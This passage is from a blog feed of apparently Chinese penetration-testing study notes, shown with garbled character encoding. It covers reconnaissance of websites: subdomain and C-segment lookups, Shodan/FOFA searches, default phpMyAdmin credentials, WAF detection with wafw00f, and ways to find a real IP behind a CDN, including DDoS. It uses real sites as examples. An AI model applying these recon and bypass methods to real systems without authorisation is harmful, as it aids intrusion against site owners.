alt="image-20210819191629848"></p><p>fofoå­åŸŸåå‘ç°</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211059918.png"></p><p>æŸ¥è¯¢å…¶å­åŸŸå</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057874.png" alt="image-20210819191942395"></p><p>Cæ®µæŸ¥è¯¢</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211059389.png" alt="image-20210921105933301"></p><p>å¤‡æ¡ˆæŸ¥è¯¢</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211059518.png" alt="image-20210921105942441"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211059842.png" alt="image-20210921105951742"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057317.png" alt="image-20210819192546441"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100729.png" alt="image-20210921110001628"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100313.png" alt="image-20210921110011238"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100269.png" alt="image-20210921110018197"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057514.png" alt="image-20210819192653583"></p><ul><li>é€šè¿‡å®˜ç½‘åç§°æœç´¢ä¿¡æ¯</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057238.png" alt="image-20210819192702579"></p><p>æœç´¢phpæœ‰å…³ç•Œé¢</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100540.png" alt="image-20210921110027422"></p><ul><li>æœç´¢æ—¶å‘ç°.xyzçš„åŸŸå</li></ul><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100579.png" alt="image-20210921110035465" style="zoom:67%;" />  <p> /robots.txt å‘ç°æœ‰ç”¨ä¿¡æ¯</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057771.png" alt="image-20210819192744431">  å‘ç°CMSä¿¡æ¯</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057773.png" alt="image-20210819192753153"></p><ul><li>å­åŸŸåæŸ¥è¯¢IP</li></ul><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057809.png" alt="image-20210819192801421">     é»‘æš—å¼•æ“æœç´¢æœ‰å…³ç«¯å£ä¿¡æ¯ç­‰</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057013.png" alt="image-20210819192813735">     æœç´¢</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057405.png" alt="image-20210819192826493"></p><p>æŸ¥çœ‹æ¼æ´</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057422.png" alt="image-20210819192834218"></p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211100223.png" alt="image-20210921110059083" style="zoom:67%;" />  <p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101638.png" alt="image-20210921110110560"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211101350.png" alt="image-20210921110118292"></p><p>å°è¯•admin</p><p>â€‹    <img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057005.png" alt="image-20210819192924475"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057302.png" alt="image-20210819192933191"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057585.png" alt="image-20210819192942536"></p><h3 id="æ¶‰åŠèµ„æºï¼š"><a href="#æ¶‰åŠèµ„æºï¼š" class="headerlink" title="æ¶‰åŠèµ„æºï¼š"></a>æ¶‰åŠèµ„æºï¼š</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">https://fofa.so/</span><br><span class="line">http://tool.chinaz.com</span><br><span class="line">https://www.shodan.io/</span><br><span class="line">https://www.zoomeye.org/</span><br><span class="line">https://nmap.org/download.html</span><br></pre></td></tr></table></figure>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>08ä¿¡æ¯æ”¶é›†--æ¶æ„ï¼Œæ­å»ºï¼ŒWAF</title>
      <link href="/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/"/>
      <url>/2021/09/21/08%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-%E6%9E%B6%E6%9E%84%EF%BC%8C%E6%90%AD%E5%BB%BA%EF%BC%8CWAF/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="å‰è¨€"><a href="#å‰è¨€" class="headerlink" title="å‰è¨€"></a>å‰è¨€</h3><p>åœ¨å®‰å…¨æµ‹è¯•ä¸­ï¼Œä¿¡æ¯æ”¶é›†æ˜¯éå¸¸é‡è¦çš„ä¸€ä¸ªç¯èŠ‚ï¼Œæ­¤ç¯èŠ‚çš„ä¿¡æ¯å°†å½±å“åˆ°åç»­çš„æˆåŠŸå‡ ç‡ï¼ŒæŒæ¡ä¿¡æ¯çš„å¤šå°‘å°†å†³å®šå‘ç°æ¼æ´æœºä¼šå¤§å°ï¼Œæ¢è¨€ä¹‹å†³å®šç€æ˜¯å¦èƒ½å®Œæˆç›®æ ‡çš„æµ‹è¯•ä»»åŠ¡ã€‚ä¹Ÿå¯ä»¥å¾ˆç›´æ¥çš„è·Ÿå¤§å®¶è¯´ï¼šæ¸—é€æµ‹è¯•çš„æ€è·¯å°±æ˜¯ä»ä¿¡æ¯æ”¶é›†è¿™é‡Œå¼€å§‹ï¼Œä½ ä¸å¤§ç‰›çš„å·®è·ä¹Ÿæ˜¯ä»è¿™é‡Œå¼€å§‹çš„ï¼</p><h3 id="ç«™ç‚¹æ­å»ºåˆ†æ"><a href="#ç«™ç‚¹æ­å»ºåˆ†æ" class="headerlink" title="ç«™ç‚¹æ­å»ºåˆ†æ"></a>ç«™ç‚¹æ­å»ºåˆ†æ</h3><h4 id="ç›®å½•ç±»ç«™ç‚¹"><a href="#ç›®å½•ç±»ç«™ç‚¹" class="headerlink" title="ç›®å½•ç±»ç«™ç‚¹"></a>ç›®å½•ç±»ç«™ç‚¹</h4><p>ä¸€ä¸ªç½‘ç«™è·¯å¾„é‡Œè¿˜æœ‰ä¸€ä¸ªç½‘ç«™ï¼Œç›¸å½“äºç½‘ç«™å¥—ç½‘ç«™ã€‚åªè¦ä¿©ä¸ªç½‘ç«™ä¸€ä¸ªé‡Œæœ‰æ¼æ´ï¼Œå°±éƒ½è¢«æ”»å…‹ã€‚</p><p>ä¸¤è€…ä»…ä»…æ˜¯ç›®å½•è·¯å¾„ä¸åŒ</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057037.png" alt="image-20210921105707970"></p><h4 id="ç«¯å£ç±»ç«™ç‚¹"><a href="#ç«¯å£ç±»ç«™ç‚¹" class="headerlink" title="ç«¯å£ç±»ç«™ç‚¹"></a>ç«¯å£ç±»ç«™ç‚¹</h4><p>ä¸€å°æœåŠ¡å™¨ä¸Šï¼Œä¸åŒç«¯å£æœ‰å¥½å‡ ä¸ªç½‘ç«™ï¼Œä¸€å°ç½‘ç«™å‡ºç°é—®é¢˜ï¼Œå…¶ä»–ç½‘ç«™ä¹Ÿä¼šè¢«æ”»å‡»</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056397.png" alt="image-20210819164038159"></p><p>â€‹    <img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056416.png" alt="image-20210819164053929"></p><h4 id="å­åŸŸåç«™ç‚¹"><a href="#å­åŸŸåç«™ç‚¹" class="headerlink" title="å­åŸŸåç«™ç‚¹"></a>å­åŸŸåç«™ç‚¹</h4><p>ä¿©ä¸ªç½‘ç«™æœ‰å¯èƒ½ä¸åœ¨ä¸€ä¸ªæœåŠ¡å™¨ä¸Š</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056410.png" alt="image-20210819164312373"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057243.png" alt="image-20210921105717173"></p><p>bbs.goodlift.neté‡‡ç”¨Discuzï¼Œä¿©ä¸ªç½‘ç«™ä¿©å¥—CMS</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056425.png" alt="image-20210819164719941"></p><p>ä¸¤ä¸ªç«™ç‚¹å¯èƒ½ä¸åœ¨åŒä¸€ä¸ªæœåŠ¡å™¨</p><h4 id="ç±»ä¼¼åŸŸåç«™ç‚¹"><a href="#ç±»ä¼¼åŸŸåç«™ç‚¹" class="headerlink" title="ç±»ä¼¼åŸŸåç«™ç‚¹"></a>ç±»ä¼¼åŸŸåç«™ç‚¹</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057014.png" alt="image-20210921105724964"></p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211057966.png" alt="image-20210921105731867"></p><p>å¤šä¸ªåŸŸåï¼ŒåŒä¸€ä¸ªç½‘ç«™</p><h4 id="æ—æ³¨ï¼ŒCæ®µç«™ç‚¹"><a href="#æ—æ³¨ï¼ŒCæ®µç«™ç‚¹" class="headerlink" title="æ—æ³¨ï¼ŒCæ®µç«™ç‚¹"></a>æ—æ³¨ï¼ŒCæ®µç«™ç‚¹</h4><p>æ—ç«™æ¦‚å¿µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">æ—ç«™æ˜¯å’Œç›®æ ‡ç½‘ç«™åœ¨åŒä¸€å°æœåŠ¡å™¨ä¸Šçš„å…¶å®ƒçš„ç½‘ç«™ï¼›å¦‚æœä»ç›®æ ‡ç«™æœ¬èº«æ‰¾ä¸åˆ°å¥½çš„å…¥æ‰‹ç‚¹ï¼Œè¿™æ—¶å€™ï¼Œå¦‚æœæƒ³å¿«é€Ÿæ‹¿ä¸‹ç›®æ ‡çš„è¯ï¼Œä¸€èˆ¬éƒ½ä¼šå…ˆæ‰¾ä¸ªç›®æ ‡ç«™ç‚¹æ‰€åœ¨æœåŠ¡å™¨ä¸Šå…¶ä»–çš„æ¯”è¾ƒå¥½æçš„ç«™ä¸‹æ‰‹ï¼Œç„¶åå†æƒ³åŠæ³•è·¨åˆ°çœŸæ­£ç›®æ ‡çš„ç«™ç‚¹ç›®å½•ä¸­ã€‚</span><br></pre></td></tr></table></figure><p>Cæ®µæ¦‚å¿µ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Cæ®µæ˜¯å’Œç›®æ ‡æœºå™¨ipå¤„åœ¨åŒä¸€ä¸ªCæ®µçš„å…¶å®ƒæœºå™¨ï¼›é€šè¿‡ç›®æ ‡æ‰€åœ¨Cæ®µçš„å…¶ä»–ä»»ä¸€å°æœºå™¨ï¼Œæƒ³åŠæ³•è·¨åˆ°æˆ‘ä»¬çš„ç›®æ ‡æœºå™¨ä¸Šã€‚å¸¸ç”¨çš„å·¥å…·æœ‰webscanccï¼ŒNmapï¼ŒZenmapã€‚</span><br></pre></td></tr></table></figure><p>åœ¨çº¿æŸ¥è¯¢å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">æ—ç«™å’ŒCæ®µåœ¨çº¿æŸ¥è¯¢åœ°å€ï¼š</span><br><span class="line">http://www.webscan.cc/</span><br><span class="line">http://stool.chinaz.com/same</span><br></pre></td></tr></table></figure><p>å¸¸ç”¨å·¥å…·</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">webï¼šk8æ—ç«™ã€å¾¡å‰‘1.5</span><br><span class="line">K8Cscanå¤§å‹å†…ç½‘æ¸—é€è‡ªå®šä¹‰æ’ä»¶åŒ–æ‰«æç¥å™¨ï¼ŒåŒ…å«ä¿¡æ¯æ”¶é›†ã€ç½‘ç»œèµ„äº§ã€æ¼æ´æ‰«æã€å¯†ç çˆ†ç ´ã€æ¼æ´åˆ©ç”¨ï¼Œç¨‹åºé‡‡ç”¨å¤šçº¿ç¨‹æ‰¹é‡æ‰«æå¤§å‹å†…ç½‘å¤šä¸ªIPæ®µCæ®µä¸»æœºï¼Œç›®å‰æ’ä»¶åŒ…å«: Cæ®µæ—æ³¨æ‰«æã€å­åŸŸåæ‰«æã€Ftpå¯†ç çˆ†ç ´ã€Mysqlå¯†ç çˆ†ç ´ã€Oracleå¯†ç çˆ†ç ´ã€MSSQLå¯†ç çˆ†ç ´ã€Windows/Linuxç³»ç»Ÿå¯†ç çˆ†ç ´ã€å­˜æ´»ä¸»æœºæ‰«æã€ç«¯å£æ‰«æã€Webä¿¡æ¯æ¢æµ‹ã€æ“ä½œç³»ç»Ÿç‰ˆæœ¬æ¢æµ‹ã€Ciscoæ€ç§‘è®¾å¤‡æ‰«æç­‰,æ”¯æŒè°ƒç”¨ä»»æ„å¤–éƒ¨ç¨‹åºæˆ–è„šæœ¬ï¼Œæ”¯æŒCobalt Strikeè”åŠ¨</span><br><span class="line">ä¸‹è½½åœ°å€ï¼šhttps://github.com/k8gege/K8CScan</span><br><span class="line">æœ€æ–°ç‰ˆLadon https://github.com/k8gege/Ladon</span><br></pre></td></tr></table></figure><h4 id="æ­å»ºè½¯ä»¶ç‰¹å¾ç«™ç‚¹"><a href="#æ­å»ºè½¯ä»¶ç‰¹å¾ç«™ç‚¹" class="headerlink" title="æ­å»ºè½¯ä»¶ç‰¹å¾ç«™ç‚¹"></a>æ­å»ºè½¯ä»¶ç‰¹å¾ç«™ç‚¹</h4><p>ä¸€ä½“åŒ–æ­å»ºè½¯ä»¶ï¼šå®å¡”ã€PHPstudyã€WMAPã€INMAPï¼ˆNginx</p><p>å¸¸è§„çš„æ­å»ºè½¯ä»¶éƒ½æœ‰å¸¸è§„çš„æ•°æ®åº“çš„é»˜è®¤è´¦å·å¯†ç ï¼Œå¦‚æœæ­å»ºè€…ä¸å»æ›´æ”¹çš„è¯ï¼Œå°±èƒ½æˆä¸ºçªç ´æ€è·¯ã€‚</p><p>ä¾‹ï¼š</p><p>Apache/2.4.41(win32)OpenSSL/1.1.1c mod_fcgid/2.3.9a  å®å¡” (ä¿¡æ¯å¾ˆå…¨åŸºæœ¬ä¸Šæ˜¯æ­å»ºè½¯ä»¶)</p><p>Apache/2.4.41(win32)OpenSSL/1.0.2j PHP/5.4.45  é»˜è®¤çš„å®‰å…¨è®¾ç½®(/phpmyadmin root/root)</p><h3 id="WAFé˜²æŠ¤åˆ†æ"><a href="#WAFé˜²æŠ¤åˆ†æ" class="headerlink" title="WAFé˜²æŠ¤åˆ†æ"></a>WAFé˜²æŠ¤åˆ†æ</h3><h4 id="ä»€ä¹ˆæ˜¯WAFåº”ç”¨"><a href="#ä»€ä¹ˆæ˜¯WAFåº”ç”¨" class="headerlink" title="ä»€ä¹ˆæ˜¯WAFåº”ç”¨"></a>ä»€ä¹ˆæ˜¯WAFåº”ç”¨</h4><p>Webåº”ç”¨é˜²æŠ¤ç³»ç»Ÿ(Web Application Firewall, ç®€ç§°:WAF)ä»£è¡¨äº†ä¸€ç±»æ–°å…´çš„ä¿¡æ¯å®‰å…¨æŠ€æœ¯ï¼Œç”¨ä»¥è§£å†³è¯¸å¦‚é˜²ç«å¢™ä¸€ç±»ä¼ ç»Ÿè®¾å¤‡æŸæ‰‹æ— ç­–çš„Webåº”ç”¨å®‰å…¨é—®é¢˜ã€‚</p><p>åˆ†ä¸ºï¼šç¡¬ä»¶å½¢å¼å’Œè½¯ä»¶å½¢å¼ã€‚</p><p>åœ¨å®‰å…¨å…¬å¸å•ä½è´­ä¹°çš„é˜²ç«å¢™éƒ½æ˜¯ç¡¬ä»¶ï¼Œä¸ªäººç½‘ç«™å’Œå°ä¼ä¸šæ­å»ºéƒ½æ˜¯è½¯ä»¶ã€‚</p><h4 id="å¦‚ä½•å¿«é€Ÿè¯†åˆ«WAF"><a href="#å¦‚ä½•å¿«é€Ÿè¯†åˆ«WAF" class="headerlink" title="å¦‚ä½•å¿«é€Ÿè¯†åˆ«WAF"></a>å¦‚ä½•å¿«é€Ÿè¯†åˆ«WAF</h4><p>é€šè¿‡wafw00fæ¥è¯†åˆ«</p><p>ä¸‹è½½åœ°å€</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/EnableSecurity/wafw00f</span><br></pre></td></tr></table></figure><p>ä½¿ç”¨æ–‡æ¡£</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/enablesecurity/wafw00f/wiki</span><br></pre></td></tr></table></figure><p>å®‰è£…ç¯å¢ƒ</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3ç¯å¢ƒ ---&gt;ä½¿ç”¨ pip install wafw00f è¿›è¡Œå®‰è£…</span><br></pre></td></tr></table></figure><p>Windowsä¸‹å®‰è£…ä½¿ç”¨</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://www.cnblogs.com/qingchengzi/articles/13451885.html</span><br></pre></td></tr></table></figure><h4 id="åˆ¤å®šwafçš„ä¸€ä¸ªæ ‡å‡†"><a href="#åˆ¤å®šwafçš„ä¸€ä¸ªæ ‡å‡†" class="headerlink" title="åˆ¤å®šwafçš„ä¸€ä¸ªæ ‡å‡†"></a>åˆ¤å®šwafçš„ä¸€ä¸ªæ ‡å‡†</h4><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211056955.png" alt="image-20210819170721484"></p><h3 id="æ¶‰åŠèµ„æº"><a href="#æ¶‰åŠèµ„æº" class="headerlink" title="æ¶‰åŠèµ„æº"></a>æ¶‰åŠèµ„æº</h3><p><a href="https://www.shodan.io/">https://www.shodan.io/</a></p><p><a href="https://www.webscan.cc/">https://www.webscan.cc/</a></p><p><a href="https://github.com/EnableSecurity/wafw00f">https://github.com/EnableSecurity/wafw00f</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> Web </tag>
            
            <tag> å°è¿ªå­¦ä¹ ç¬”è®° </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>07ä¿¡æ¯æ”¶é›†--CDNç»•è¿‡æŠ€æœ¯</title>
      <link href="/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/"/>
      <url>/2021/09/21/07%E4%BF%A1%E6%81%AF%E6%94%B6%E9%9B%86-CDN%E7%BB%95%E8%BF%87%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<p>ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†ğŸ˜†</p><span id="more"></span><h3 id="CDN"><a href="#CDN" class="headerlink" title="CDN"></a>CDN</h3><p>CDN çš„å…¨ç§°æ˜¯ Content Delivery Networkï¼Œå³å†…å®¹åˆ†å‘ç½‘ç»œã€‚CDN æ˜¯æ„å»ºåœ¨ç°æœ‰ç½‘ç»œåŸºç¡€ä¹‹ä¸Šçš„æ™ºèƒ½è™šæ‹Ÿç½‘ç»œï¼Œä¾é éƒ¨ç½²åœ¨å„åœ°çš„è¾¹ç¼˜æœåŠ¡å™¨ï¼Œé€šè¿‡ä¸­å¿ƒå¹³å°çš„è´Ÿè½½å‡è¡¡ã€å†…å®¹åˆ†å‘ã€è°ƒåº¦ç­‰åŠŸèƒ½æ¨¡å—ï¼Œä½¿ç”¨æˆ·å°±è¿‘è·å–æ‰€éœ€å†…å®¹ï¼Œé™ä½ç½‘ç»œæ‹¥å¡ï¼Œæé«˜ç”¨æˆ·è®¿é—®å“åº”é€Ÿåº¦å’Œå‘½ä¸­ç‡ã€‚ä½†åœ¨å®‰å…¨æµ‹è¯•è¿‡ç¨‹ä¸­ï¼Œè‹¥ç›®æ ‡å­˜åœ¨ CDN æœåŠ¡ï¼Œå°†ä¼šå½±å“åˆ°åç»­çš„å®‰å…¨æµ‹è¯•è¿‡ç¨‹ã€‚</p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211049339.png" alt="image-20210921104908229" style="zoom:80%;" /><p>ç›¸å½“äºä¸€ä¸ªèŠ‚ç‚¹ï¼ŒæŠŠç½‘ç«™ä¸Šçš„ä¸€äº›ç¼“å­˜æ”¾åˆ°cdnä¸­ï¼Œä½ è®¿é—®åˆ°çš„ipä¸æ˜¯åŸç½‘ç«™è€Œæ˜¯cdnã€‚æ‰€æœ‰å¦‚æœéœ€è¦è¿›è¡Œæ¸—é€æµ‹è¯•éœ€è¦ç»•è¿‡cdnï¼Œæ‰¾åˆ°çœŸå®ç½‘ç«™çš„ipã€‚</p><h3 id="å¦‚ä½•åˆ¤æ–­ç›®æ ‡å­˜åœ¨-CDN-æœåŠ¡ï¼Ÿ"><a href="#å¦‚ä½•åˆ¤æ–­ç›®æ ‡å­˜åœ¨-CDN-æœåŠ¡ï¼Ÿ" class="headerlink" title="å¦‚ä½•åˆ¤æ–­ç›®æ ‡å­˜åœ¨ CDN æœåŠ¡ï¼Ÿ"></a>å¦‚ä½•åˆ¤æ–­ç›®æ ‡å­˜åœ¨ CDN æœåŠ¡ï¼Ÿ</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://ping.chinaz.com</span><br></pre></td></tr></table></figure><p>åˆ©ç”¨å¤šèŠ‚ç‚¹æŠ€æœ¯è¿›è¡Œè¯·æ±‚è¿”å›åˆ¤æ–­</p><ul><li><p>æœ‰CDNæƒ…å†µï¼š</p></li><li><p>æœ‰å¤šä¸ªIPè¿”å›ï¼Œè¯´æ˜å­˜åœ¨CDN</p><p><img src="C:\Users\lenovo\AppData\Roaming\Typora\typora-user-images\image-20210921104916943.png" alt="image-20210921104916943"></p></li><li><p>æ— CDNæƒ…å†µ:</p><p>åªæœ‰1ä¸ªIPè¿”å›</p><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048734.png" alt="image-20210819143741293"></p></li></ul><h3 id="CDNç»•è¿‡æŠ€æœ¯"><a href="#CDNç»•è¿‡æŠ€æœ¯" class="headerlink" title="CDNç»•è¿‡æŠ€æœ¯"></a>CDNç»•è¿‡æŠ€æœ¯</h3><h4 id="å­åŸŸåæŸ¥è¯¢"><a href="#å­åŸŸåæŸ¥è¯¢" class="headerlink" title="å­åŸŸåæŸ¥è¯¢"></a>å­åŸŸåæŸ¥è¯¢</h4><p>å¦‚æœæˆ‘ä»¬æŸ¥åˆ°ä»–çš„å­åŸŸåçš„ipä¸å˜ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡pingæ¢æµ‹åŒä¸€ç½‘æ®µçš„ipï¼Œçœ‹ä¸»ç½‘ç«™æ˜¯å¦å’Œä»–åœ¨ä¸€ä¸ªç½‘ç«™ã€‚</p><h4 id="é‚®ä»¶æœåŠ¡æŸ¥è¯¢"><a href="#é‚®ä»¶æœåŠ¡æŸ¥è¯¢" class="headerlink" title="é‚®ä»¶æœåŠ¡æŸ¥è¯¢"></a>é‚®ä»¶æœåŠ¡æŸ¥è¯¢</h4><p>æ ¹æ®å¯¹æ–¹é‚®ä»¶æœåŠ¡å™¨çš„åœ°å€æ¥è·å–å¯¹æ–¹ç½‘ç«™çœŸæ­£çš„ip</p><h4 id="å›½å¤–åœ°å€è¯·æ±‚"><a href="#å›½å¤–åœ°å€è¯·æ±‚" class="headerlink" title="å›½å¤–åœ°å€è¯·æ±‚"></a>å›½å¤–åœ°å€è¯·æ±‚</h4><p>å¯ä»¥é€šè¿‡ä¼ªé€ å›½å¤–ipåœ°å€è®¿é—®ç½‘ç«™ï¼Œæ¥è·å–çœŸå®ç½‘ç«™ipï¼Œvpnæ¥ä¼ªé€ </p><h4 id="é—ç•™æ–‡ä»¶ï¼Œæ‰«æå…¨ç½‘"><a href="#é—ç•™æ–‡ä»¶ï¼Œæ‰«æå…¨ç½‘" class="headerlink" title="é—ç•™æ–‡ä»¶ï¼Œæ‰«æå…¨ç½‘"></a>é—ç•™æ–‡ä»¶ï¼Œæ‰«æå…¨ç½‘</h4><p>è°·æ­Œæœç´¢æŸ¥çœ‹è¯¥ç½‘ç«™çš„é—ç•™æ–‡ä»¶ï¼Œæ¥è·å–ip eg:phpinfo</p><h4 id="é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶"><a href="#é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶" class="headerlink" title="é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶"></a>é»‘æš—å¼•æ“æœç´¢ç‰¹å®šæ–‡ä»¶</h4><p>shodanã€fofaã€ zoomeye</p><h4 id="DNSå†å²è®°å½•ï¼Œä»¥é‡æ‰“é‡ï¼ˆDDOSï¼‰"><a href="#DNSå†å²è®°å½•ï¼Œä»¥é‡æ‰“é‡ï¼ˆDDOSï¼‰" class="headerlink" title="DNSå†å²è®°å½•ï¼Œä»¥é‡æ‰“é‡ï¼ˆDDOSï¼‰"></a>DNSå†å²è®°å½•ï¼Œä»¥é‡æ‰“é‡ï¼ˆDDOSï¼‰</h4><p> DNSè®°å½•æœ‰ä¹‹å‰æ²¡åšCDNæ—¶å€™çš„IPè®°å½•ï¼›DDOSå°†CDNæµé‡æ‰“å®Œï¼Œè®¿é—®çš„å°±æ˜¯çœŸå®IP</p><h3 id="CDN-çœŸå®-IP-åœ°å€è·å–åç»‘å®šæŒ‡å‘åœ°å€"><a href="#CDN-çœŸå®-IP-åœ°å€è·å–åç»‘å®šæŒ‡å‘åœ°å€" class="headerlink" title="CDN çœŸå® IP åœ°å€è·å–åç»‘å®šæŒ‡å‘åœ°å€"></a>CDN çœŸå® IP åœ°å€è·å–åç»‘å®šæŒ‡å‘åœ°å€</h3><p>æ›´æ”¹æœ¬åœ° HOSTS è§£ææŒ‡å‘æ–‡ä»¶</p><h3 id="æ¼”ç¤ºæ¡ˆä¾‹"><a href="#æ¼”ç¤ºæ¡ˆä¾‹" class="headerlink" title="æ¼”ç¤ºæ¡ˆä¾‹"></a>æ¼”ç¤ºæ¡ˆä¾‹</h3><h4 id="åˆ©ç”¨å­åŸŸåè¯·æ±‚è·å–IPåœ°å€"><a href="#åˆ©ç”¨å­åŸŸåè¯·æ±‚è·å–IPåœ°å€" class="headerlink" title="åˆ©ç”¨å­åŸŸåè¯·æ±‚è·å–IPåœ°å€"></a>åˆ©ç”¨å­åŸŸåè¯·æ±‚è·å–IPåœ°å€</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">xueersi å­åŸŸåä¸Šçš„å°æŠ€å·§</span><br><span class="line">www.xueersi.com</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211050133.png" alt="image-20210921105002067"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">xueersi.com</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048727.png" alt="image-20210819145226004"></p><p>åŸå› ï¼šåªè®¾ç½®äº†<a href="http://www.xueersi.comçš„cdnè§£æ,æ²¡è®¾ç½®xueersi.comçš„cdnè§£æ/">www.xueersi.comçš„cdnè§£æï¼Œæ²¡è®¾ç½®xueersi.comçš„cdnè§£æ</a></p><h4 id="åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¥å£æŸ¥è¯¢è·å–çœŸå®IP"><a href="#åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¥å£æŸ¥è¯¢è·å–çœŸå®IP" class="headerlink" title="åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¥å£æŸ¥è¯¢è·å–çœŸå®IP"></a>åˆ©ç”¨ç¬¬ä¸‰æ–¹æ¥å£æŸ¥è¯¢è·å–çœŸå®IP</h4><p>sp910 DNSå†å²è®°å½•=ç¬¬ä¸‰æ–¹æ¥å£ï¼ˆæ¥å£æŸ¥è¯¢ï¼‰</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://x.threatbook.cn/</span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Gzero_GG/images/raw/master/img/202109211048736.png" alt="image-20210819145757460"></p><h4 id="åˆ©ç”¨å›½å¤–åœ°å€è¯·æ±‚è·å–çœŸå®IP"><a href="#åˆ©ç”¨å›½å¤–åœ°å€è¯·æ±‚è·å–çœŸå®IP" class="headerlink" title="åˆ©ç”¨å›½å¤–åœ°å€è¯·æ±‚è·å–çœŸå®IP"></a>åˆ©ç”¨å›½å¤–åœ°å€è¯·æ±‚è·å–çœŸå®IP</h4><p>m.sp910 